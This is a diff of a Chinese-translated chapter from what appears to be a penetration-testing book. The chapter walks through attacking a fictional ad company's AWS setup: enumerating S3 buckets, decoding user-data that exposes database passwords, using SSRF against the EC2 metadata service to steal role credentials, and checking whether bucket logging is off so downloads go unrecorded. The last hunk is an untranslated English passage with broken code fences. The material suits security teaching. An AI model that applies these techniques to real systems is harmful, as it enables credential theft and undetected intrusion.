@@ -1,6 +1,4 @@
-# 5
-
-漏洞探索
+# 漏洞探索
 
 ![](img/chapterart.png)
 
@@ -29,7 +27,7 @@
 让我们回到我们的域名列表，并将 DNS 调查再推进一步，以找出这些隐藏的域名。我们要寻找 *CNAME* *记录*（指向其他名称记录的名称记录），而不是 IP 地址（如更常见的 A 记录）。命令 `getent hosts` 可以提取这些 CNAME 记录：
 
 ```
-root@Point1:~/# **getent hosts thor.mxrads.com**
+root@Point1:~/# getent hosts thor.mxrads.com
 91.152.253.4    e9657.b.akamaiedge.net stellar.mxrads.com
 stellar.mxrads.com.edgekey.net
 ```
@@ -67,7 +65,7 @@ S3 可以托管从 JavaScript 文件到数据库备份的任何内容。在许�
 我们在图 5-1 中的小型 DNS 图展示了四个 S3 URL——dl.mxrads.com、misc.mxrads.com、assets.mxrads.com 和 resource.mxrads.com——但实际上可能还有更多需要揭示的内容。在检查这些桶之前，我们先将这些 URL 过滤掉。有时，Akamai 和 CloudFront 可以通过 ALIAS 记录隐藏 S3 桶。为了彻底，我们将遍历 18 个 Akamai 和 CloudFront 的 URL，并仔细查看 HTTP 响应中的`Server`指令：
 
 ```
-root@Point1:~/# **while read p; do \**
+root@Point1:~/# while read p; do \
 **echo $p, $(curl --silent -I -i https://$p | grep AmazonS3) \**
 **done <cloudfront_akamai_subdomains.txt**
 
@@ -121,8 +119,8 @@ AWS 结合这四个设置的规则来决定是否接受一个传入的操作。�
 回到我们的桶列表。我们浏览了一遍，除了*misc.mxrads.com*外，其他都无法访问，奇怪的是，*misc.mxrads.com*返回了一个空白页面。没有出现错误肯定是个好兆头。让我们使用 AWS 命令行进一步探查。首先，我们安装 AWS 命令行接口（CLI）：
 
 ```
-root@Point1:~/# **sudo apt install awscli**
-root@Point1:~/# **aws configure**
+root@Point1:~/# sudo apt install awscli
+root@Point1:~/# aws configure
 # Enter any valid set of credentials to unlock the CLI.
 # You can use your own AWS account, for instance.
 ```
@@ -132,8 +130,8 @@ AWS CLI 不接受 S3 URL，因此我们需要弄清楚*misc.mxrads.com*背后的
 拿到这个桶名后，我们可以利用 AWS CLI 的强大功能。首先，通过命令列出桶内所有对象，并将结果保存到一个文本文件中：
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-misc > list_objects.txt**
-root@Point1:~/# **head list_objects.txt**
+root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-misc > list_objects.txt
+root@Point1:~/# head list_objects.txt
 { "Contents": [{
      "Key": "Archive/",
      "LastModified": "2015-04-08T22:01:48.000Z",
@@ -153,7 +151,7 @@ root@Point1:~/# **head list_objects.txt**
 我们得到了很多对象——太多了，无法手动检查。为了确切知道有多少个对象，我们使用 grep 来查找"Key"参数：
 
 ```
-root@Point1:~/# **grep '"Key"' list_objects.txt |wc -l**
+root@Point1:~/# grep '"Key"' list_objects.txt |wc -l
 425927
 ```
 
@@ -163,11 +161,11 @@ root@Point1:~/# **grep '"Key"' list_objects.txt |wc -l**
 
 ```
 # We extract the filenames in the "Key" parameters:
-root@Point1:~/# **grep '"Key"' list_objects | sed 's/[",]//g' > list_keys.txt**
+root@Point1:~/# grep '"Key"' list_objects | sed 's/[",]//g' > list_keys.txt
 
-root@Point1:~/# **patterns='\.sh$|\.sql$|\.tar\.gz$\.properties$|\.config$|\.tgz$'**
+root@Point1:~/# patterns='\.sh$|\.sql$|\.tar\.gz$\.properties$|\.config$|\.tgz$'
 
-root@Point1:~/# **egrep $patterns list_keys.txt**
+root@Point1:~/# egrep $patterns list_keys.txt
   Key: debug/360-ios-safari/deploy.sh
  Key: debug/ias-vpaidjs-ios/deploy.sh
   Key: debug/vpaid-admetrics/deploy.sh
@@ -186,7 +184,7 @@ root@Point1:~/# **egrep $patterns list_keys.txt**
 是时候尝试一些其他的方法了。也许有些敏感数据文件逃过了我们之前的模式过滤，也许有些带有不常见扩展名的文件藏在一堆文件中。为了找到这些文件，我们进行了一次激进的反向搜索，排除了常见且无用的文件，如图片、层叠样式表（CSS）和字体，试图揭示一些隐藏的宝藏：
 
 ```
-root@Point1:~/# **egrep -v\**
+root@Point1:~/# egrep -v\
 **"\.jpg|\.png|\.js|\.woff|/\",$|\.css|\.gif|\.svg|\.ttf|\.eot" list_keys.xt**
 
 Key: demo/forbes/ios/7817/index.html
@@ -197,7 +195,7 @@ Key: demo/forbes/ios/7817/index_12.html
 Key: demo/forbes/ios/7817/index_13.html
 --`snip`--
 
-root@Point1:~/# **aws s3api get-object --bucket mxrads-misc \**
+root@Point1:~/# aws s3api get-object --bucket mxrads-misc \
 **--key demo/forbes/ios/7817/index.html forbes_index.html**
 ```
 
@@ -260,11 +258,11 @@ WebSocket 通信看起来相当简单：每条发往服务器的消息都由一�
 我们将修改后的请求转发，并前往我们的 Docker 容器查看日志。我们使用 `docker ps` 获取容器 ID，然后将其传递给 `docker logs`：
 
 ```
-root@Nginx:~/# **docker ps**
+root@Nginx:~/# docker ps
 CONTAINER ID        IMAGE                COMMAND
 5923186ffda5        sparcflow/ngi...   "/bin/bash /sc..."
 
-root@Nginx:~/# **docker logs 5923186ffda5**
+root@Nginx:~/# docker logs 5923186ffda5
 54.221.12.35 - - [26/Oct/2020:13:44:08 +0000] "GET / HTTP/1.1"...
 ```
 
@@ -291,7 +289,7 @@ http://54.14.153.41/:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...
 我们检查日志，果然，看到来自应用的请求传了过来：
 
 ```
-root@Point1:~/# **docker logs 5923186ffda5**
+root@Point1:~/# docker logs 5923186ffda5
 54.221.12.35 - - [26/Oct/2020:13:53:12 +0000] "GET / HTTP/1.1"...
 ```
 
@@ -454,7 +452,7 @@ write_files:
 精彩。这段二进制数据经过 base64 编码，所以我们将解码、解压，并惊叹其内容，如列表 5-5 所示。
 
 ```
-root@Point1:~/# **echo H4sIAAA...|base64 -d |gunzip**
+root@Point1:~/# echo H4sIAAA...|base64 -d |gunzip
 
 ANALYTICS_URL_CHECKSUM_SEED = 180309210013
 CASSANDRA_ADS_USERSYNC_PASS = QZ6bhOWiCprQPetIhtSv
@@ -502,7 +500,7 @@ write_files:
 我们还有一个编码的二进制数据 1。通过使用一些`base64`和`gunzip`技巧，我们将这堆垃圾转换为一个普通的 bash 脚本，该脚本定义了各种端点、用户名以及其他参数，具体取决于机器运行的区域（请参见列表 5-8）。我将跳过许多条件分支和 case 语句，只打印相关部分。
 
 ```
-root@Point1:~/# **echo H4sIAAA...|base64 -d |gunzip**
+root@Point1:~/# echo H4sIAAA...|base64 -d |gunzip
 
 AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
 REGION=${AZ%?}
@@ -585,7 +583,7 @@ http://0xa9fea9fe/latest/meta-data/iam/security-credentials/demo-role.ec2
 
 ```
 # On our attacking machine
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [demo]
 aws_access_key_id = ASIA44ZRK6WSX2BRFIXC
 aws_secret_access_key = +ACjXR87naNXyKKJWmW/5r/+B/+J5PrsmBZ
@@ -620,4 +618,4 @@ is not authorized to perform: iam:GetRole on resource: role demo-role-ec2
 
 我们需要做一些研究。几乎每个 AWS 服务都有一些 API 调用，用来描述或列出其所有资源（EC2 的 `describe-instances`、S3 的 `list-buckets` 等等）。因此，我们可以慢慢开始探测最常用的服务，看看我们可以用这些凭证做什么，然后逐步测试 AWS 的各种服务。
 
-````One option is to go nuts and try every possible AWS API call (there are thousands) until we hit an authorized query, but the avalanche of errors we’d trigger in the process would knock any security team out of their hibernal sleep. By default, most AWS API calls are logged, so it’s quite easy for a company to set up alerts tracking the number of unauthorized calls. And why wouldn’t they? It literally takes a few clicks to set up these alerts via the monitoring service CloudWatch.    Plus, AWS provides a service called GuardDuty that automatically monitors and reports all sorts of unusual behaviors, such as spamming 5,000 API calls, so caution is paramount. This is not your average bank with 20 security appliances and a $200K/year outsourced SOC team that still struggles to aggregate and parse Windows events. We need to be clever and reason about it purely from context.    For instance, remember that mxrads-dl S3 bucket that made it to this instance’s *user-data*? We could not access that before without credentials, but maybe the demo-role.ec2 role has some S3 privileges that could grant us access? We find out by calling on the AWS API to list MXR Ads’ S3 buckets:    ``` # On our attacking machine root@Point1:~/# **aws s3api listbuckets --profile demo** An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied ```    Okay, trying to list all S3 buckets in the account was a little too bold, but it was worth a shot. Let’s take it back and take baby steps now. Again using the demo-role.ec2 role, we try just listing keys inside the mxrads-dl bucket. Remember, we were denied access earlier without credentials:    ``` root@Point1:~/# **aws s3api list-objects-v2 --profile demo --bucket mxrads-dl >** **list_objects_dl.txt** root@Point1:~/# **grep '"Key"' list_objects_dl | sed 's/[",]//g' >** **list_keys_dl.txt**  root@Point1:~/# **head list_keys_dl.txt**   Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2   Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5 `--snip--` ```    Now we are getting somewhere! We get a list of keys and save them away. As a precaution, before we go berserk and download every file stored in this bucket, we can make sure that logging is indeed disabled on S3 object operations. We call the `get-bucket-logging` API:    ``` root@Point1:~/# **aws s3api get-bucket-logging --profile demo --bucket mxrads-dl**  <empty_response> ```    And we find it’s empty. No logging. Perfect. You may be wondering why a call to this obscure API succeeded. Why would an instance profile need such a permission? To understand this weird behavior, have a look at the full list of possible S3 operations at [`docs.aws.amazon.com/`](https://docs.aws.amazon.com/). Yes, there are hundreds of operations that can be allowed or denied on a bucket.    AWS has done a spectacular job defining very fine-grained permissions for each tiny and sometimes inconsequential task. No wonder most admins simply assign wildcard permissions when setting up buckets. A user needs read-only access to a bucket? A `Get*` will do the job; little do they realize that a `Get*` implies 31 permissions on S3 alone! `GetBucketPolicy` to get the policy, `GetBucketCORS` to return CORS restrictions, `GetBucketACL` to get the access control list, and so forth.    Bucket policies are mostly used to grant access to foreign AWS accounts or add another layer of protection against overly permissive IAM policies granted to users. A user with an `s3:*` permission could therefore be rejected with a bucket policy that only allows some users or requires a specific source IP. Here we attempt to get the bucket policy for mxrads-dl to see if it does grant access to any other AWS accounts:    ``` root@Point1:~/# **aws s3api get-bucket-policy --bucket mxrads-dl** {   "Id": "Policy1572108106689",   "Version": "2012-10-17",   "Statement": [       {          "Sid": "Stmt1572108105248",          "Action": [              "s3:List*", " s3:Get*"          ],          "Effect": "Allow",          "Resource": "arn:aws:s3:::mxrads-dl",          "Principal": {            1 "AWS": "arn:aws:iam::983457354409:root"          }    }] } ```    This policy references the foreign AWS account 983457354409 1. This account could be Gretsch Politico, an internal MXR Ads department with its own AWS account, or a developer’s personal account for that matter. We cannot know for sure, at least not yet. We’ll note it for later examination.    ### Examining the Key List    We go back to downloading the bucket’s entire key list and dive into the heap, hoping to find sensitive data and get an idea of the bucket’s purpose. We have an impressive number of public binaries and *.jar* files. We find a collection of the major software players with different versions, such as Nginx, Java collections, and Log4j. It seems they replicated some sort of public distribution point. We find a couple of bash scripts that automate the `docker login` command or provide helper functions for AWS commands, but nothing stands out as sensitive.    From this, we deduce that this bucket probably acts as a corporate-wide package distribution center. Systems and applications must use it to download software updates, packages, archives, and other widespread packages. I guess not every public S3 is an El Dorado waiting to be pilfered.    We turn to the *user-data* script we pulled earlier hoping for additional clues about services to query, but find nothing out of note. We even try a couple of AWS APIs with the demo role credentials to common services like EC2, Lambda, and Redshift out of desperation, only to get that delicious error message back. How frustrating it is to have valid keys yet stay stranded at the front door simply because there are a thousand keyholes to try . . . but that’s just the way it is sometimes.    As with most dead ends, the only way forward is to go backward, at least for a while. It’s not like the data we gathered so far is useless; we have database and AWS credentials that may prove useful in the future, and most of all, we gained some insight into how the company handles its infrastructure. We only need a tiny spark to ignite for the whole ranch to catch fire. We still have close to a hundred domains to check. We will get there.    ## Resources    *   See this short introduction to Burp if you are not familiar with the tool: [`bit.ly/2QEQmo9`](http://bit.ly/2QEQmo9)*.* *   Check out the progressive capture-the-flag exercises at [`flaws.cloud/`](http://flaws.cloud/) to get you acquainted with basic cloud-hacking reflexes. *   CloudBunny and fav-up are tools that can help you bust out the IP addresses of services hiding behind CDNs: [`github.com/Warflop/CloudBunny/`](https://github.com/Warflop/CloudBunny/)and [`github.com/pielco11/fav-up/`](https://github.com/pielco11/fav-up/)*.* *   You can read more about techniques to uncover bucket names at the following links: [`bit.ly/36KVQn2`](http://bit.ly/36KVQn2) and [`bit.ly/39Xy6ha`](http://bit.ly/39Xy6ha). *   The difference between CNAME and ALIAS records is discussed at [`bit.ly/2FBWoPU`](http://bit.ly/2FBWoPU). *   This website lists a number of open S3 buckets if you’re in for a quick hunt: [`buckets.grayhatwarfare.com/`](https://buckets.grayhatwarfare.com/)*.* *   More information on S3 bucket policies can be found here: [`amzn.to/2Nbhngy`](https://amzn.to/2Nbhngy)*.* *   Further reading on WebSockets is available at [`bit.ly/35FsTHN`](http://bit.ly/35FsTHN). *   Check out this blog about IMDSv2: [`go.aws/35EzJgE`](https://go.aws/35EzJgE).````*
+````One option is to go nuts and try every possible AWS API call (there are thousands) until we hit an authorized query, but the avalanche of errors we’d trigger in the process would knock any security team out of their hibernal sleep. By default, most AWS API calls are logged, so it’s quite easy for a company to set up alerts tracking the number of unauthorized calls. And why wouldn’t they? It literally takes a few clicks to set up these alerts via the monitoring service CloudWatch.    Plus, AWS provides a service called GuardDuty that automatically monitors and reports all sorts of unusual behaviors, such as spamming 5,000 API calls, so caution is paramount. This is not your average bank with 20 security appliances and a $200K/year outsourced SOC team that still struggles to aggregate and parse Windows events. We need to be clever and reason about it purely from context.    For instance, remember that mxrads-dl S3 bucket that made it to this instance’s *user-data*? We could not access that before without credentials, but maybe the demo-role.ec2 role has some S3 privileges that could grant us access? We find out by calling on the AWS API to list MXR Ads’ S3 buckets:    ``` # On our attacking machine root@Point1:~/# aws s3api listbuckets --profile demo An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied ```    Okay, trying to list all S3 buckets in the account was a little too bold, but it was worth a shot. Let’s take it back and take baby steps now. Again using the demo-role.ec2 role, we try just listing keys inside the mxrads-dl bucket. Remember, we were denied access earlier without credentials:    ``` root@Point1:~/# aws s3api list-objects-v2 --profile demo --bucket mxrads-dl > **list_objects_dl.txt** root@Point1:~/# grep '"Key"' list_objects_dl | sed 's/[",]//g' > **list_keys_dl.txt**  root@Point1:~/# head list_keys_dl.txt   Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2   Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5 `--snip--` ```    Now we are getting somewhere! We get a list of keys and save them away. As a precaution, before we go berserk and download every file stored in this bucket, we can make sure that logging is indeed disabled on S3 object operations. We call the `get-bucket-logging` API:    ``` root@Point1:~/# aws s3api get-bucket-logging --profile demo --bucket mxrads-dl  <empty_response> ```    And we find it’s empty. No logging. Perfect. You may be wondering why a call to this obscure API succeeded. Why would an instance profile need such a permission? To understand this weird behavior, have a look at the full list of possible S3 operations at [`docs.aws.amazon.com/`](https://docs.aws.amazon.com/). Yes, there are hundreds of operations that can be allowed or denied on a bucket.    AWS has done a spectacular job defining very fine-grained permissions for each tiny and sometimes inconsequential task. No wonder most admins simply assign wildcard permissions when setting up buckets. A user needs read-only access to a bucket? A `Get*` will do the job; little do they realize that a `Get*` implies 31 permissions on S3 alone! `GetBucketPolicy` to get the policy, `GetBucketCORS` to return CORS restrictions, `GetBucketACL` to get the access control list, and so forth.    Bucket policies are mostly used to grant access to foreign AWS accounts or add another layer of protection against overly permissive IAM policies granted to users. A user with an `s3:*` permission could therefore be rejected with a bucket policy that only allows some users or requires a specific source IP. Here we attempt to get the bucket policy for mxrads-dl to see if it does grant access to any other AWS accounts:    ``` root@Point1:~/# aws s3api get-bucket-policy --bucket mxrads-dl {   "Id": "Policy1572108106689",   "Version": "2012-10-17",   "Statement": [       {          "Sid": "Stmt1572108105248",          "Action": [              "s3:List*", " s3:Get*"          ],          "Effect": "Allow",          "Resource": "arn:aws:s3:::mxrads-dl",          "Principal": {            1 "AWS": "arn:aws:iam::983457354409:root"          }    }] } ```    This policy references the foreign AWS account 983457354409 1. This account could be Gretsch Politico, an internal MXR Ads department with its own AWS account, or a developer’s personal account for that matter. We cannot know for sure, at least not yet. We’ll note it for later examination.    ### Examining the Key List    We go back to downloading the bucket’s entire key list and dive into the heap, hoping to find sensitive data and get an idea of the bucket’s purpose. We have an impressive number of public binaries and *.jar* files. We find a collection of the major software players with different versions, such as Nginx, Java collections, and Log4j. It seems they replicated some sort of public distribution point. We find a couple of bash scripts that automate the `docker login` command or provide helper functions for AWS commands, but nothing stands out as sensitive.    From this, we deduce that this bucket probably acts as a corporate-wide package distribution center. Systems and applications must use it to download software updates, packages, archives, and other widespread packages. I guess not every public S3 is an El Dorado waiting to be pilfered.    We turn to the *user-data* script we pulled earlier hoping for additional clues about services to query, but find nothing out of note. We even try a couple of AWS APIs with the demo role credentials to common services like EC2, Lambda, and Redshift out of desperation, only to get that delicious error message back. How frustrating it is to have valid keys yet stay stranded at the front door simply because there are a thousand keyholes to try . . . but that’s just the way it is sometimes.    As with most dead ends, the only way forward is to go backward, at least for a while. It’s not like the data we gathered so far is useless; we have database and AWS credentials that may prove useful in the future, and most of all, we gained some insight into how the company handles its infrastructure. We only need a tiny spark to ignite for the whole ranch to catch fire. We still have close to a hundred domains to check. We will get there.    ## Resources    *   See this short introduction to Burp if you are not familiar with the tool: [`bit.ly/2QEQmo9`](http://bit.ly/2QEQmo9)*.* *   Check out the progressive capture-the-flag exercises at [`flaws.cloud/`](http://flaws.cloud/) to get you acquainted with basic cloud-hacking reflexes. *   CloudBunny and fav-up are tools that can help you bust out the IP addresses of services hiding behind CDNs: [`github.com/Warflop/CloudBunny/`](https://github.com/Warflop/CloudBunny/)and [`github.com/pielco11/fav-up/`](https://github.com/pielco11/fav-up/)*.* *   You can read more about techniques to uncover bucket names at the following links: [`bit.ly/36KVQn2`](http://bit.ly/36KVQn2) and [`bit.ly/39Xy6ha`](http://bit.ly/39Xy6ha). *   The difference between CNAME and ALIAS records is discussed at [`bit.ly/2FBWoPU`](http://bit.ly/2FBWoPU). *   This website lists a number of open S3 buckets if you’re in for a quick hunt: [`buckets.grayhatwarfare.com/`](https://buckets.grayhatwarfare.com/)*.* *   More information on S3 bucket policies can be found here: [`amzn.to/2Nbhngy`](https://amzn.to/2Nbhngy)*.* *   Further reading on WebSockets is available at [`bit.ly/35FsTHN`](http://bit.ly/35FsTHN). *   Check out this blog about IMDSv2: [`go.aws/35EzJgE`](https://go.aws/35EzJgE).````*
